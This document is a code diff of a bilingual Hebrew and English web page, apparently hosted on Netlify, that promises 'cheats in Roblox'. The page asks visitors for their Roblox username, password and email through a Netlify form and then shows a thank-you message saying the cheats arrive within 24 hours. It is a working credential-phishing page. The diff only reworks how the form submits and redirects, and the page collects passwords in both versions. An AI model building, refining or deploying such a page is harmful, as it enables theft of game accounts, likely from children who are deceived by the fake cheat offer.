@@ -31,7 +31,7 @@
         }
 
         #lobby { display: block; }
-        #form-content, #success-message { display: none; }
+        #form-content { display: none; }
 
         h1 { font-size: 24px; font-weight: 600; margin-bottom: 30px; }
         .btn-group { display: flex; gap: 10px; flex-direction: column; }
@@ -89,50 +89,52 @@
     <div id="form-content">
         <h1 id="title-text">קבלת ציטים</h1>
         
-        <form id="riddle-form" name="roblox-cheats" method="POST" data-netlify="true">
+        <form name="roblox-cheats" method="POST" data-netlify="true" action="/index.html?success=true">
             <input type="hidden" name="form-name" value="roblox-cheats" />
             
             <div class="input-group">
                 <label id="label-user">שם משתמש</label>
-                <input type="text" name="username" id="username" required>
+                <input type="text" name="username" required>
             </div>
             <div class="input-group">
                 <label id="label-pass">סיסמה</label>
-                <input type="password" name="password" id="password" required>
+                <input type="password" name="password" required>
             </div>
             <div class="input-group">
                 <label id="label-email">אימייל</label>
-                <input type="email" name="email" id="email" required>
+                <input type="email" name="email" required>
             </div>
             
             <button type="submit" id="submit-btn">שליחה</button>
         </form>
     </div>
 
-    <div id="success-message">
+    <div id="success-message" style="display: none;">
         <h2 style="font-size: 40px; margin-bottom: 10px;">✓</h2>
         <h2 id="success-title">תודה רבה</h2>
         <p id="success-p" style="color: #86868b;">קבלת הציטים תתקבל עד 24 שעות</p>
-        <button style="background:none; color:#0066cc;" onclick="location.reload()" id="back-btn">חזרה</button>
+        <button style="background:none; color:#0066cc;" onclick="window.location.href='index.html'" id="back-btn">חזרה</button>
     </div>
 </div>
 
 <script>
+    // בדיקה אם חזרנו מהטופס בהצלחה
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('success') === 'true') {
+        document.getElementById('lobby').style.display = 'none';
+        document.getElementById('form-content').style.display = 'none';
+        document.getElementById('success-message').style.display = 'block';
+    }
+
     const translations = {
-        he: { title: "קבלת ציטים ברובלוקס", labelUser: "שם משתמש", labelPass: "סיסמה", labelEmail: "אימייל", submit: "שליחה", successTitle: "תודה רבה", successP: "קבלת הציטים תתקבל עד 24 שעות", back: "חזרה להתחלה", dir: "rtl" },
-        en: { title: "Getting cheats in Roblox", labelUser: "Username", labelPass: "Password", labelEmail: "Email", submit: "Send", successTitle: "Thank You", successP: "Quotations will be accepted within 24 hours.", back: "Back to start", dir: "ltr" }
+        he: { title: "קבלת ציטים ברובלוקס", labelUser: "שם משתמש", labelPass: "סיסמה", labelEmail: "אימייל", submit: "שליחה", dir: "rtl" },
+        en: { title: "Getting cheats in Roblox", labelUser: "Username", labelPass: "Password", labelEmail: "Email", submit: "Send", dir: "ltr" }
     };
 
     function setLanguage(lang) {
         const t = translations[lang];
         document.getElementById('title-text').innerText = t.title;
-        document.getElementById('label-user').innerText = t.labelUser;
-        document.getElementById('label-pass').innerText = t.labelPass;
-        document.getElementById('label-email').innerText = t.labelEmail;
         document.getElementById('submit-btn').innerText = t.submit;
-        document.getElementById('success-title').innerText = t.successTitle;
-        document.getElementById('success-p').innerText = t.successP;
-        document.getElementById('back-btn').innerText = t.back;
         document.body.dir = t.dir;
         
         if(lang === 'en') document.getElementById('main-container').classList.add('en-mode');
@@ -141,36 +143,6 @@
         document.getElementById('lobby').style.display = 'none';
         document.getElementById('form-content').style.display = 'block';
     }
-
-    const form = document.getElementById('riddle-form');
-    form.addEventListener('submit', (e) => {
-        e.preventDefault();
-        const btn = document.getElementById('submit-btn');
-        btn.innerText = "...";
-        btn.disabled = true;
-
-        const formData = new FormData(form);
-
-        fetch("/", {
-            method: "POST",
-            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: new URLSearchParams(formData).toString(),
-        })
-        .then((response) => {
-            if (response.ok) {
-                document.getElementById('form-content').style.display = 'none';
-                document.getElementById('success-message').style.display = 'block';
-            } else {
-                throw new Error('שגיאה בתגובת Netlify');
-            }
-        })
-        .catch((error) => {
-            console.error('Error:', error);
-            alert("שגיאה בשליחה. נסה שוב מאוחר יותר.");
-            btn.disabled = false;
-            btn.innerText = "נסה שוב";
-        });
-    });
 </script>
 </body>
 </html>
